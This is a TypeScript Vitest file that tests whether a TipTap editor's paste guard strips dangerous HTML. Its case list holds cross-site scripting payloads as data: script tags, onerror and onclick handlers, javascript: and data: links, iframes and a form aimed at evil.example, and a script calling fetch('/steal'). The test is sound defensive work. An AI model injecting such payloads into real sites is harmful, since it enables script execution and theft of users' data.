// @vitest-environment happy-dom
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { Editor } from "@tiptap/core";
import StarterKit from "@tiptap/starter-kit";
import TextAlign from "@tiptap/extension-text-align";
import Underline from "@tiptap/extension-underline";
import Link from "@tiptap/extension-link";
import { sanitiseRichHtml } from "@/lib/sanitize-rich";

/**
 * Integration test for the TipTap paste guard.
 *
 * The `RichTextEditor` component wires `transformPastedHTML: sanitiseRichHtml`
 * into ProseMirror's editorProps. This test spins up a real TipTap editor
 * with the same configuration and drives the exact paste code path
 * ProseMirror uses (`view.someProp("transformPastedHTML")`), then reads back
 * the editor's HTML to prove that no disallowed elements ever reach the
 * document tree.
 */

function makeEditor(dir: "rtl" | "ltr" = "rtl") {
  const element = document.createElement("div");
  document.body.appendChild(element);
  return new Editor({
    element,
    extensions: [
      StarterKit.configure({ heading: { levels: [2, 3] } }),
      Underline,
      Link.configure({ openOnClick: false, autolink: true }),
      TextAlign.configure({ types: ["heading", "paragraph"], defaultAlignment: dir === "rtl" ? "right" : "left" }),
    ],
    content: "",
    editorProps: {
      transformPastedHTML: (html: string) => sanitiseRichHtml(html),
    },
  });
}

// Simulate ProseMirror's paste pipeline: it calls every registered
// `transformPastedHTML` prop, then parses the result and inserts it.
function pasteHtml(editor: Editor, html: string): string {
  const view = editor.view;
  const cleaned = view.someProp("transformPastedHTML", (fn) => fn(html, view)) ?? html;
  editor.commands.insertContent(cleaned);
  return cleaned;
}

describe("TipTap paste sanitisation", () => {
  let editor: Editor;

  beforeEach(() => {
    editor = makeEditor();
  });
  afterEach(() => {
    editor?.destroy();
    document.body.innerHTML = "";
  });

  it("wires transformPastedHTML into the editor view", () => {
    const fn = editor.view.someProp("transformPastedHTML");
    expect(typeof fn).toBe("function");
  });

  const CASES: Array<{ name: string; html: string; forbidden: RegExp[]; kept?: RegExp[] }> = [
    {
      name: "<script> block from Word/Google Docs",
      html: `<p>hello</p><script>alert('xss')</script>`,
      forbidden: [/<script/i, /alert\(/i],
      kept: [/hello/],
    },
    {
      name: "<img onerror> payload",
      html: `<p>ok</p><img src=x onerror="alert(1)" />`,
      forbidden: [/<img/i, /onerror/i, /alert\(/i],
      kept: [/ok/],
    },
    {
      name: "iframe embed",
      html: `<p>a</p><iframe src="https://evil.example"></iframe><p>b</p>`,
      forbidden: [/<iframe/i, /evil\.example/i],
      kept: [/a/, /b/],
    },
    {
      name: "inline event handlers on allowed tags",
      html: `<p onclick="alert(1)" onmouseover="alert(2)">click</p>`,
      forbidden: [/onclick/i, /onmouseover/i, /alert\(/i],
      kept: [/click/],
    },
    {
      name: "javascript: link scheme",
      html: `<p><a href="javascript:alert(1)">go</a></p>`,
      forbidden: [/javascript:/i, /alert\(/i],
    },
    {
      name: "data: link scheme",
      html: `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
      forbidden: [/data:/i, /base64/i],
    },
    {
      name: "style / background url injection",
      html: `<p style="background:url('javascript:alert(1)')">t</p>`,
      forbidden: [/background/i, /url\(/i, /javascript:/i],
      kept: [/t/],
    },
    {
      name: "mixed-case obfuscation",
      html: `<ScRiPt>alert(1)</ScRiPt><P>ok</P>`,
      forbidden: [/<script/i, /alert\(/i],
      kept: [/ok/i],
    },
    {
      name: "meta refresh",
      html: `<meta http-equiv="refresh" content="0;url=javascript:alert(1)"><p>ok</p>`,
      forbidden: [/<meta/i, /javascript:/i],
      kept: [/ok/],
    },
    {
      name: "form/input phishing",
      html: `<form action="https://evil.example"><input name="pw" /></form><p>ok</p>`,
      forbidden: [/<form/i, /<input/i, /evil\.example/i],
      kept: [/ok/],
    },
    {
      name: "arabic paragraph with embedded script",
      html: `<p dir="rtl">مرحبا بالعالم</p><script>fetch('/steal')</script>`,
      forbidden: [/<script/i, /fetch\(/i, /steal/i],
      kept: [/مرحبا/],
    },
  ];

  for (const c of CASES) {
    it(`paste blocks: ${c.name}`, () => {
      pasteHtml(editor, c.html);
      const rendered = editor.getHTML();
      for (const re of c.forbidden) {
        expect(rendered, `payload "${c.name}" leaked ${re}: ${rendered}`).not.toMatch(re);
      }
      for (const re of c.kept ?? []) {
        expect(rendered).toMatch(re);
      }
    });
  }

  it("keeps safe formatting from a real Word paste", () => {
    const word = `<h2>Report</h2><p><strong>Bold</strong> and <em>italic</em></p><ul><li>one</li><li>two</li></ul>`;
    pasteHtml(editor, word);
    const out = editor.getHTML();
    expect(out).toMatch(/Report/);
    expect(out).toMatch(/<strong>Bold<\/strong>/);
    expect(out).toMatch(/<em>italic<\/em>/);
    expect(out).toMatch(/<li>[\s\S]*one[\s\S]*<\/li>/);
    expect(out).toMatch(/<li>[\s\S]*two[\s\S]*<\/li>/);
  });

  it("forces rel/target on pasted external links", () => {
    pasteHtml(editor, `<p><a href="https://example.com">ok</a></p>`);
    const out = editor.getHTML();
    expect(out).toMatch(/href="https:\/\/example\.com"/);
    // TipTap's Link mark keeps the rel/target attrs the sanitiser added.
    expect(out).toMatch(/rel="[^"]*noopener[^"]*"/);
    expect(out).toMatch(/target="_blank"/);
  });
});